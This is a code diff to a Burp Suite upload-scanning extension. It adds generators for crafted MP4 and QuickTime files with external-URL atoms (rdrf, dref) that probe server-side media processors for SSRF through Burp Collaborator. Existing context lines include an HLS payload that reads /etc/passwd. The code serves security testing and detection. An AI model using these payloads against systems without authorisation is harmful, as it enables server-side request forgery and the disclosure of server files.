@@ -1226,6 +1226,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 _progress("LibAVFormat")
                 print "\nDoing LibAVFormat checks"
                 colab_tests.extend(self._libavformat(injector, burp_colab))
+                colab_tests.extend(self._mp4_qt_external_url(injector, burp_colab))
                 self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
             # PHP RCEs - generic, as there will always be someone who screws up PHP:
             if injector.opts.modules['php'].isSelected():
@@ -2202,6 +2203,121 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                                                                    "header.m3u8|subfile,,start,0,end,4096,,:/etc/passwd")))
 
         return colabs
+
+    def _mp4_qt_external_url(self, injector, burp_colab):
+        colab_tests = []
+        if not burp_colab:
+            return colab_tests
+        if not injector.opts.file_formats['mp4'].isSelected():
+            return colab_tests
+
+        import struct as _s
+
+        def _box(btype, data):
+            return _s.pack('>I', 8 + len(data)) + btype + data
+
+        def _fullbox(btype, version, flags, data):
+            return _s.pack('>I', 12 + len(data)) + btype + chr(version) + _s.pack('>I', flags)[1:] + data
+
+        identity = (
+            _s.pack('>I', 0x00010000) + _s.pack('>I', 0) + _s.pack('>I', 0) +
+            _s.pack('>I', 0) + _s.pack('>I', 0x00010000) + _s.pack('>I', 0) +
+            _s.pack('>I', 0) + _s.pack('>I', 0) + _s.pack('>I', 0x40000000)
+        )
+
+        def _build_qt_ref_movie(url):
+            """QuickTime reference movie: moov/rmra/rmda/rdrf — causes QT parsers to fetch url."""
+            rdrf_data = ('\x00\x00\x00\x00'            # version + flags
+                         + 'url '                       # data ref type
+                         + _s.pack('>I', len(url) + 1)  # data ref size (url + NUL)
+                         + url + '\x00')                # null-terminated URL
+            return _box('moov', _box('rmra', _box('rmda', _box('rdrf', rdrf_data))))
+
+        def _build_mp4_dref(url):
+            """Minimal ISOBMFF MP4 with external URL in dref (flags=0 → parser fetches url)."""
+            url_entry = _fullbox('url ', 0, 0, url + '\x00')
+            dref  = _fullbox('dref', 0, 0, _s.pack('>I', 1) + url_entry)
+            dinf  = _box('dinf', dref)
+
+            stsd  = _fullbox('stsd', 0, 0, _s.pack('>I', 0))
+            stts  = _fullbox('stts', 0, 0, _s.pack('>I', 0))
+            stsc  = _fullbox('stsc', 0, 0, _s.pack('>I', 0))
+            stsz  = _fullbox('stsz', 0, 0, _s.pack('>II', 0, 0))
+            stco  = _fullbox('stco', 0, 0, _s.pack('>I', 0))
+            stbl  = _box('stbl', stsd + stts + stsc + stsz + stco)
+
+            nmhd  = _fullbox('nmhd', 0, 0, '')
+            minf  = _box('minf', nmhd + dinf + stbl)
+
+            mdhd  = _fullbox('mdhd', 0, 0,
+                             _s.pack('>IIII', 0, 0, 1000, 0) +
+                             _s.pack('>HH', 0x55C4, 0))
+            hdlr  = _fullbox('hdlr', 0, 0,
+                             _s.pack('>I', 0) + 'url ' +
+                             _s.pack('>III', 0, 0, 0) + '\x00')
+            mdia  = _box('mdia', mdhd + hdlr + minf)
+
+            tkhd  = _fullbox('tkhd', 0, 3,
+                             _s.pack('>IIIII', 0, 0, 1, 0, 0) +
+                             _s.pack('>II', 0, 0) +
+                             _s.pack('>hhhH', 0, 0, 0, 0) +
+                             identity +
+                             _s.pack('>II', 0, 0))
+            trak  = _box('trak', tkhd + mdia)
+
+            mvhd  = _fullbox('mvhd', 0, 0,
+                             _s.pack('>IIII', 0, 0, 1000, 0) +
+                             _s.pack('>IH', 0x00010000, 0x0100) +
+                             _s.pack('>H', 0) + _s.pack('>II', 0, 0) +
+                             identity +
+                             _s.pack('>IIIIII', 0, 0, 0, 0, 0, 0) +
+                             _s.pack('>I', 2))
+            moov  = _box('moov', mvhd + trak)
+
+            ftyp  = _box('ftyp', 'isom' + _s.pack('>I', 0) + 'isom' + 'iso2')
+            return ftyp + moov
+
+        mp4_types = {
+            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', '.mp4', 'video/mp4'),
+            ('', '.mp4', ''),
+            ('', '.mov', 'video/quicktime'),
+            ('', '.mov', ''),
+        }
+
+        name = "MP4/QuickTime external URL atom (SSRF)"
+        severity = "High"
+        confidence = "Firm"
+
+        # QuickTime reference movie (rmra/rmda/rdrf)
+        def _qt_replace(_, url):
+            return _build_qt_ref_movie(url)
+
+        basename_qt = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Mp4QtRef"
+        detail_qt = ("A Burp Collaborator interaction was detected when uploading a QuickTime reference "
+                     "movie containing an 'rdrf' atom that points to an external URL. This indicates "
+                     "that the server-side media processor fetched the collaborator URL during demuxing "
+                     "(moov/rmra/rmda/rdrf atom chain), confirming Server Side Request Forgery. "
+                     "Interactions:<br><br>")
+        issue_qt = self._create_issue_template(injector.get_brr(), name, detail_qt, confidence, severity)
+        colab_tests.extend(self._send_collaborator(injector, burp_colab, mp4_types, basename_qt,
+                                                   "placeholder", issue_qt, replace=_qt_replace))
+
+        # ISOBMFF dref (dinf/dref/url  with flags=0 → external)
+        def _dref_replace(_, url):
+            return _build_mp4_dref(url)
+
+        basename_dref = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Mp4Dref"
+        detail_dref = ("A Burp Collaborator interaction was detected when uploading an ISOBMFF MP4 "
+                       "containing a 'dref' atom whose 'url ' entry has flags=0 (external data "
+                       "reference). This indicates that the media demuxer fetched the collaborator "
+                       "URL when resolving the track's data location, confirming Server Side Request "
+                       "Forgery. Interactions:<br><br>")
+        issue_dref = self._create_issue_template(injector.get_brr(), name, detail_dref, confidence, severity)
+        colab_tests.extend(self._send_collaborator(injector, burp_colab, mp4_types, basename_dref,
+                                                   "placeholder", issue_dref, replace=_dref_replace))
+
+        return colab_tests
 
     def _php_rce_params(self, extension, mime, content=""):
         lang = "PHP"
